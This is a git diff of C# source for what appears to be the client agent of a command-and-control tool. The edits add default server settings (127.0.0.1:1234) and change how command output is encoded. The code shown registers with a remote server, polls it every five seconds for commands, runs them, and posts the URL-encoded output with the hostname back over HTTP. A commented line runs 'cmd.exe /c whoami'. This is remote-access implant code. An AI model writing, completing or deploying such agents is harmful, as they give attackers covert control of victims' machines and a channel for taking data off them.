@@ -7,6 +7,7 @@ using System.Net.Http;
 using System.Runtime;
 using System.IO;
 using System.Text;
+using System.Web;
 
 // testing running cmd
 using System.Diagnostics;
@@ -19,29 +20,38 @@ namespace client
         // tasks enables threading for now
         static async Task Main(string[] args)
         {
+            //takes command line args of IP and Port
+            int tport;
+            string tipaddress;
+
             try {
-                //takes command line args of IP and Port
-                Communicator comm = new Communicator(args[0], Int32.Parse(args[1]));
-                //await Communicator.GetRequest(comm.host);
-                await comm.RegisterAgent();
-
-                // test command exeuction
-                // this is a bit janky
-                //System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
-
-                // run getcommand every 5 seconds
-                int AgentCheckInterval = 5000;
-                while (true) {
-                    if(comm.errored){
-                        Console.WriteLine("Error in communication, exiting");
-                        break;
-                    }
-                    await comm.GetCommand();
-                    await Task.Delay(AgentCheckInterval);
-                }
+                tport = Int32.Parse(args[1]);
+                tipaddress = args[0];
+                //Listener test = new Listener(args[0], tport, args[2]);
             } catch (System.IndexOutOfRangeException) {
-                Console.WriteLine("Please provide the IP and port of the server to connect to.");
-                Environment.Exit(0);
+                tport = 1234;
+                tipaddress = "127.0.0.1";
+                
+                Console.WriteLine("No arguments provided, using defaults...");
+            }
+
+            Communicator comm = new Communicator(tipaddress, tport);
+            //await Communicator.GetRequest(comm.host);
+            await comm.RegisterAgent();
+
+            // test command exeuction
+            // this is a bit janky
+            //System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
+
+            // run getcommand every 5 seconds
+            int AgentCheckInterval = 5000;
+            while (true) {
+                if(comm.errored){
+                    Console.WriteLine("Error in communication, exiting");
+                    break;
+                }
+                await comm.GetCommand();
+                await Task.Delay(AgentCheckInterval);
             }
         }
 
@@ -141,8 +151,11 @@ namespace client
                         using (StreamReader reader = process.StandardOutput)
                         {
                             string result = await reader.ReadToEndAsync();
+                            result = HttpUtility.UrlEncode(result);
+                            Console.WriteLine(result);
+                            //Convert.ToBase64String(Encoding.UTF8.GetBytes(result));
                             //strip special characters as to not mess with the HTTP request
-                            result = result.Replace("\n", "").Replace("\r", "").Replace("\\", "\\\\");
+                            //result = result.Replace("\n", "").Replace("\r", "").Replace("\\", "\\\\");
                             string responseBody = $"{{\"hostname\": \"{hostname}\",\"response\": \"{result}\"}}";
                             
                             (bool l, string a) = await BuildAndSendHTTPRequest(new StringContent(responseBody));
